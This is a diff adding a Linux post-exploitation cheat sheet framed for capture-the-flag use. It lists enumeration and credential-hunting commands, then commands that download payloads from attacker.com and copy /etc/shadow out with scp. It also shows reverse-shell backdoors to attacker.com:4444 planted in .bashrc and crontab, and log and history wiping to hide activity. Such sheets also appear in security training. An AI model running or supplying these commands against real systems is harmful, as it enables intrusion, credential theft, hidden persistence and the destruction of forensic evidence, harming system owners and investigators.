@@ -1,1 +1,65 @@
+========================================
+🎯 CTF Post-Exploitation Cheat Sheet
+Target: Linux
+========================================
 
+📌 SYSTEM ENUM
+whoami
+id
+uname -a
+hostnamectl
+cat /etc/os-release
+uptime
+
+📌 USER & GROUPS
+who
+w
+last
+cat /etc/passwd
+cat /etc/group
+sudo -l
+
+📌 NETWORK ENUM
+ip a
+ifconfig -a
+route -n
+netstat -tunlp
+ss -tuln
+cat /etc/resolv.conf
+iptables -L
+
+📌 SERVICES & PROCESSES
+ps aux
+top -n 1
+systemctl list-units --type=service --state=running
+crontab -l
+ls -la /etc/cron*
+
+📌 FILES / CREDS
+find / -name "*pass*" -o -name "*.conf" -o -name "*.key" -o -name "*.pem" 2>/dev/null
+grep -r "password" /etc/ 2>/dev/null
+cat ~/.bash_history
+
+📌 PRIVESC ATTEMPTS
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+env | grep -i user
+
+📌 DOWNLOAD / EXFIL
+curl http://attacker.com/shell.sh -o /tmp/shell.sh
+wget http://attacker.com/binary -O /tmp/binary
+scp /etc/shadow user@attacker.com:/tmp/shadow
+
+📌 BACKDOOR / PERSISTENCE
+echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bashrc
+(crontab -l ; echo "* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -
+
+📌 CLEAR LOGS
+cat /dev/null > ~/.bash_history
+history -c
+rm -rf /var/log/wtmp /var/log/btmp /var/log/auth.log
+
+========================================
+💡 Tip: Upload tools like linpeas.sh, pspy, or lse
+========================================
